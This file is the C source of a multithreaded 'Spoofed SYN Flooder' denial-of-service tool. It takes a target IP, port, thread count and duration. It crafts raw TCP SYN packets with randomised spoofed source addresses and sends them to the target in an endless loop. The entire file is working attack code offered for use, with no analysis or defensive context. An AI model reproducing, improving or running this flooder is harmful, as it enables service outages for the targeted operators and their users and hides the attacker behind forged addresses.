#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
 
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
 
static uint32_t Q[4096], c = 362436;

struct thread_data{
	int thread_id;
	unsigned int floodport;
	struct sockaddr_in sin;
};
 
void init_rand(uint32_t x)
{
        int i;
 
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
 
        for (i = 3; i < 4096; i++)
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
 
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
  sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}
void setup_ip_header(struct iphdr *iph)
{
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
  iph->id = htonl(54321);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = 6;  // upper layer protocol, TCP
  iph->check = 0;

  // Initial IP, changed later in infinite loop
  iph->saddr = inet_addr("192.168.3.100");
}

void setup_tcp_header(struct tcphdr *tcph)
{
  tcph->source = htons(5678);
  tcph->seq = random();
  tcph->ack_seq = 0;
  tcph->res2 = 0;
  tcph->doff = 5; // Make it look like there will be data
  tcph->syn = 1;
  tcph->window = htonl(65535);
  tcph->check = 0;
  tcph->urg_ptr = 0;
}

void *flood(void *par1)
{
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct tcphdr *tcph = (/*u_int8_t*/void *)iph + (5 * sizeof(u_int32_t));
  struct sockaddr_in sin = td->sin;
  char new_ip[sizeof "255.255.255.255"];

  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if(s < 0){
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }

  unsigned int floodport = td->floodport;

  // Clear the data
  memset(datagram, 0, MAX_PACKET_SIZE);

  // Set appropriate fields in headers
  setup_ip_header(iph);
  setup_tcp_header(tcph);

  tcph->dest = htons(floodport);

  iph->daddr = sin.sin_addr.s_addr;
  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

  int tmp = 1;
  const int *val = &tmp;
  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }

  uint32_t random_num;
  uint32_t ul_dst;
  init_rand(time(NULL));
  while(1){
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    random_num = rand_cmwc();

    ul_dst = (random_num >> 24 & 0xFF) << 24 |
             (random_num >> 16 & 0xFF) << 16 |
             (random_num >> 8 & 0xFF) << 8 |
             (random_num & 0xFF);

    iph->saddr = ul_dst;
    tcph->source = htons(random_num & 0xFFFF);
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    random_num = rand_cmwc();

    ul_dst = (random_num >> 24 & 0xFF) << 24 |
             (random_num >> 16 & 0xFF) << 16 |
             (random_num >> 8 & 0xFF) << 8 |
             (random_num & 0xFF);

    iph->saddr = ul_dst;
    tcph->source = htons(random_num & 0xFFFF);
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    random_num = rand_cmwc();

    ul_dst = (random_num >> 24 & 0xFF) << 24 |
             (random_num >> 16 & 0xFF) << 16 |
             (random_num >> 8 & 0xFF) << 8 |
             (random_num & 0xFF);

    iph->saddr = ul_dst;
    tcph->source = htons(random_num & 0xFFFF);
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    random_num = rand_cmwc();

    ul_dst = (random_num >> 24 & 0xFF) << 24 |
             (random_num >> 16 & 0xFF) << 16 |
             (random_num >> 8 & 0xFF) << 8 |
             (random_num & 0xFF);

    iph->saddr = ul_dst;
    tcph->source = htons(random_num & 0xFFFF);
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
   random_num = rand_cmwc();

    ul_dst = (random_num >> 24 & 0xFF) << 24 |
             (random_num >> 16 & 0xFF) << 16 |
             (random_num >> 8 & 0xFF) << 8 |
             (random_num & 0xFF);

    iph->saddr = ul_dst;
    tcph->source = htons(random_num & 0xFFFF);
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
  }
}
int main(int argc, char *argv[ ])
{
  if(argc < 4){
    fprintf(stderr, "Invalid parameters!\n");
    fprintf(stdout, "Spoofed SYN Flooder v1.6.1 FINAL by ohnoes1479\nUsage: %s <target IP/hostname> <port to be flooded> <number threads to use> <time (optional)>\n", argv[0]);
    exit(-1);
  }

  fprintf(stdout, "Setting up Sockets...\n");

  int num_threads = atoi(argv[3]);
  unsigned int floodport = atoi(argv[2]);
  pthread_t thread[num_threads];
  struct sockaddr_in sin;

  sin.sin_family = AF_INET;
  sin.sin_port = htons(floodport);
  sin.sin_addr.s_addr = inet_addr(argv[1]);

  struct thread_data td[num_threads];

  int i;
  for(i = 0;i<num_threads;i++){
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].floodport = floodport;
    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
  }
  fprintf(stdout, "Starting Flood...\n");
  if(argc > 4)
  {
    sleep(atoi(argv[4]));
  } else {
    while(1){
      sleep(1);
    }
  }

  return 0;
}
